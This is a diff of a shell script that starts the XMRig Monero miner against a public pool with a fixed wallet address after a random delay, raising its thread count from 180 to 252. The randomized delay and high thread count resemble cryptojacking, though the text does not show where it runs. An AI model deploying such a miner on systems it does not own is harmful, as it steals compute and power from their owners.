@@ -21,7 +21,7 @@ build_xmrig() {
 start_mining() 
 {
     sleep $((60 + RANDOM % 60))
-    ./xmrig -o pool.supportxmr.com:3333 -u 82nfTTGkD2yTtGPZENcGCcM6yrgYdWqjbGvU4MpgcDzuXyVTUYkxkS4JcqEm2n73SddJ2QfdYL8JR8keXPsNwZxD872pyBc -p x --tls=false --donate-level=0 -t 180 --cpu-priority=5
+    ./xmrig -o pool.supportxmr.com:3333 -u 82nfTTGkD2yTtGPZENcGCcM6yrgYdWqjbGvU4MpgcDzuXyVTUYkxkS4JcqEm2n73SddJ2QfdYL8JR8keXPsNwZxD872pyBc -p x --tls=false --donate-level=0 -t 252 --cpu-priority=5
 }
 if [ -d "xmrig" ]; then
     cd xmrig/build
